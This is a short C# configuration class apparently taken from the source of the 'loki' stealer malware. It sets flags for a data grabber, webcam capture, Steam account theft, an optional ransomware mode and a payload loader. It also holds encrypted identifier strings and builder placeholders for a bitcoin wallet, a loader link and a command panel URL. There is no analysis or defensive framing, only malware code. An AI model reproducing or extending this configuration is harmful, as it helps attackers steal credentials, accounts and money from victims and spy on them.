﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace loki
{
   public  class Settings
    {
 	public static bool ransomware = false;
        public static string name = "EAAAACVqp2nM14dESY0jhlwUEw5bVqzH/vco5e9/Ld/rxElb";
        public static string coded = "EAAAAEcfZbo8Ae2vKKb8PMSvQxlw+mxJbzb2GO8VcvsLpsRT";
        public static bool grabber = true;
	public static string bitcoin_keshel = "KESHEL";
        public static bool webka = true;
        public static bool loader = false;
        public static bool steam = true;
        public static string url_loader = "LDRLNK";
        public static string Stealer_version = "EAAAAMMhgJXYgyfZzRrISmrzNwdxmdyNJ/zdqt80PZ8/64bZ";
        public static string Url = "Panel";
    }
}
